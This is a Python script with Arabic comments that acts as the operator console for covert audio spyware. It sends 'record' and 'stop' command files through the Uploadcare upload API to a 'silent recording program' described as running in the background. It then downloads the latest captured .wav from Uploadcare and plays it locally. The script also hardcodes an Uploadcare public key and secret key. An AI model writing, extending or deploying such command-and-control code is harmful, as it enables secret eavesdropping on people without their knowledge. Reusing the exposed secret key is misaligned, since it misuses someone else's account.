import json
import time
import urllib.request
import winsound

PUBLIC_KEY = "268436c97119fc09a608"
SECRET_KEY = "ca00ccfe9ab2096ba638"


def send_command(cmd_filename):
    """إرسال أمر إلى السيرفر (CMD_RECORD.txt أو CMD_STOP.txt)."""
    boundary = "----UploadcareBoundary12345"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="UPLOADCARE_PUB_KEY"\r\n\r\n'
        f"{PUBLIC_KEY}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="UPLOADCARE_STORE"\r\n\r\n'
        f"0\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{cmd_filename}"\r\n'
        f"Content-Type: text/plain\r\n\r\n"
        f"SIGNAL"
        f"\r\n--{boundary}--\r\n"
    ).encode("utf-8")

    req = urllib.request.Request(
        "https://upload.uploadcare.com/base/",
        data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        method="POST",
    )
    urllib.request.urlopen(req)


def fetch_and_play_audio():
    """الانتظار ثم جلب وتشغيل الصوت المسجل."""
    print("⏳ جاري الانتظار 10 ثوانٍ حتى ينتهي التسجيل والرفع...")
    time.sleep(10)

    api_url = (
        "https://api.uploadcare.com/files/?ordering=-datetime_uploaded&limit=1"
    )
    req = urllib.request.Request(api_url)
    req.add_header(
        "Authorization", f"Uploadcare.Simple {PUBLIC_KEY}:{SECRET_KEY}"
    )
    req.add_header("Accept", "application/vnd.uploadcare-v0.7+json")

    try:
        with urllib.request.urlopen(req) as response:
            data = json.loads(response.read().decode("utf-8"))
            results = data.get("results", [])

            if results:
                latest = results[0]
                filename = latest.get("original_filename", "")
                file_uuid = latest.get("uuid")

                if filename.endswith(".wav"):
                    direct_url = f"https://ucarecdn.com/{file_uuid}/{filename}"
                    print(f"🎵 تم استلام التسجيل: {direct_url}")

                    local_filename = "downloaded_audio.wav"
                    urllib.request.urlretrieve(direct_url, local_filename)

                    print("🔊 جاري تشغيل الصوت...")
                    winsound.PlaySound(local_filename, winsound.SND_FILENAME)
                else:
                    print("لم يجهز ملف الصوت بعد.")
    except Exception as e:
        print("حدث خطأ أثناء جلب الصوت:", e)


if __name__ == "__main__":
    print("=== لوحة التحكم عن بعد ===")
    print("1. إرسال أمر بدء التسجيل والاستماع للصوت")
    print("2. إرسال أمر إيقاف التطبيق تماماً في الخلفية")
    choice = input("اختر رقم الأمر (1 أو 2): ").strip()

    if choice == "1":
        send_command("CMD_RECORD.txt")
        print("✅ تم إرسال أمر التسجيل.")
        fetch_and_play_audio()
    elif choice == "2":
        send_command("CMD_STOP.txt")
        print(
            "🛑 تم إرسال أمر الإيقاف! سيتوقف برنامج التسجيل الصامت عن العمل والخلفية فوراً."
        )